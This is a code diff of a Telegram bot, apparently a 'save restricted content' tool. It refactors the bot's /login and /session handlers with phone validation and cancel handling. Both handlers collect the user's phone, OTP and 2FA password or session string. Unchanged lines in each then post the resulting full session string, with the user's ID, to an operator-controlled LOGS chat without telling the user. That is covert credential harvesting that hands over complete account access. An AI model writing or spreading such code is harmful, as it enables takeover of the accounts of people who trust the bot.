@@ -117,61 +117,110 @@ async def disconnect_bot(event):
         await event.reply("🔓 Disconnected.")
     else:
         await event.reply("🔐 Not connected.")
-
 # ---------- login ----------
+PHONE_RE = re.compile(r"^\+\d{1,3}\s*\d{4,}$")
+
 @bot.on(events.NewMessage(pattern="/login", func=lambda e: e.is_private))
 async def login_phone(event):
     if await db.is_logged(event.sender_id):
         return await event.reply("Already logged in.")
-    phone = await bot.ask(event.chat_id, "Send phone (intl. format):", timeout=60)
-    phone = phone.text.strip()
+
+    attempts = 0
+    phone = None
+    while attempts < 3:
+        async with bot.conversation(event.chat_id) as conv:
+            ask = await conv.send_message(
+                "Send your phone in **international format** (e.g. **+1 58543464**):")
+            resp = await conv.get_response()
+            if _is_cancel(event, resp.text):
+                return
+            if PHONE_RE.match(resp.text.strip()):
+                phone = resp.text.strip()
+                break
+            attempts += 1
+            await conv.send_message(
+                "❌  Invalid format. Example: **+1 58543464**\nTry again:")
+    if phone is None:
+        return await event.reply("Too many failed attempts. Aborting.")
+
     client = Client("login_temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
     try:
-        await client.connect(); sent = await client.send_code(phone)
+        await client.connect()
+        sent = await client.send_code(phone)
     except FloodWait as fw:
-        await event.reply(f"FloodWait {fw.value}s – try /session instead."); return await client.disconnect()
+        await event.reply(f"FloodWait {fw.value}s – try /session instead.")
+        return await client.disconnect()
     except (PhoneNumberInvalid, ApiIdInvalid):
-        await event.reply("Invalid phone/api – try /session instead."); return await client.disconnect()
+        await event.reply("Invalid phone/api – try /session instead.")
+        return await client.disconnect()
     except Exception:
-        await event.reply("SMS failed – use /session instead."); return await client.disconnect()
+        await event.reply("SMS failed – use /session instead.")
+        return await client.disconnect()
 
-    code = await bot.ask(event.chat_id, "OTP sent – enter in `1 2 3 4 5` format:", timeout=60)
+    async with bot.conversation(event.chat_id) as conv:
+        code_raw = await conv.send_message("OTP sent – enter in `1 2 3 4 5` format:")
+        code_resp = await conv.get_response()
+        if _is_cancel(event, code_resp.text):
+            return await client.disconnect()
+        code = " ".join(code_resp.text.split())
+
     try:
-        await client.sign_in(phone, sent.phone_code_hash, phone_code=" ".join(code.text.split()))
+        await client.sign_in(phone, sent.phone_code_hash, phone_code=code)
     except PhoneCodeInvalid:
-        await event.reply("Wrong code – retry /login."); return await client.disconnect()
+        await event.reply("Wrong code – retry /login.")
+        return await client.disconnect()
     except PhoneCodeExpired:
-        await event.reply("Code expired – retry /login."); return await client.disconnect()
+        await event.reply("Code expired – retry /login.")
+        return await client.disconnect()
     except SessionPasswordNeeded:
-        pwd = await bot.ask(event.chat_id, "2FA password:", timeout=60)
-        await client.check_password(pwd.text)
+        async with bot.conversation(event.chat_id) as conv:
+            pwd_raw = await conv.send_message("2FA password:")
+            pwd_resp = await conv.get_response()
+            if _is_cancel(event, pwd_resp.text):
+                return await client.disconnect()
+            await client.check_password(pwd_resp.text)
     except Exception as ex:
-        await event.reply(f"Login failed – {ex}"); return await client.disconnect()
+        await event.reply(f"Login failed – {ex}")
+        return await client.disconnect()
 
-    s = await client.export_session_string(); me = await client.get_me()
-    await db.loin(event.sender_id); await login(event.sender_id, API_ID, API_HASH, s)
+    s = await client.export_session_string()
+    me = await client.get_me()
+    await db.loin(event.sender_id)
+    await login(event.sender_id, API_ID, API_HASH, s)
     await event.reply(f"✅ Logged in as {me.first_name}\nSend links to save.")
     if LOGS:
         await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
     await client.disconnect()
+
 
 # ---------- session ----------
 @bot.on(events.NewMessage(pattern="/session", func=lambda e: e.is_private))
 async def login_session(event):
     if await db.is_logged(event.sender_id):
         return await event.reply("Already logged in.")
-    s = await bot.ask(event.chat_id, "Send **Pyrogram** session string:", timeout=60)
-    if len(s.text) < 300:
+
+    async with bot.conversation(event.chat_id) as conv:
+        ask = await conv.send_message("Send **Pyrogram** session string:")
+        resp = await conv.get_response()
+        if _is_cancel(event, resp.text):
+            return
+        s = resp.text.strip()
+
+    if len(s) < 300:
         return await event.reply("Invalid string – too short.")
+
     try:
-        async with Client("saverestricted", session_string=s.text, api_id=API_ID, api_hash=API_HASH) as cli:
+        async with Client("saverestricted", session_string=s, api_id=API_ID, api_hash=API_HASH) as cli:
             me = await cli.get_me()
-            await db.loin(event.sender_id); await login(event.sender_id, API_ID, API_HASH, s.text)
+            await db.loin(event.sender_id)
+            await login(event.sender_id, API_ID, API_HASH, s)
             await event.reply(f"✅ Logged in as {me.first_name}")
             if LOGS:
-                await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s.text}`")
+                await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
     except Exception as ex:
         await event.reply(f"Invalid session – {ex}")
+
+
 
 # ---------- logout ----------
 @bot.on(events.NewMessage(pattern="/logout", func=lambda e: e.is_private))
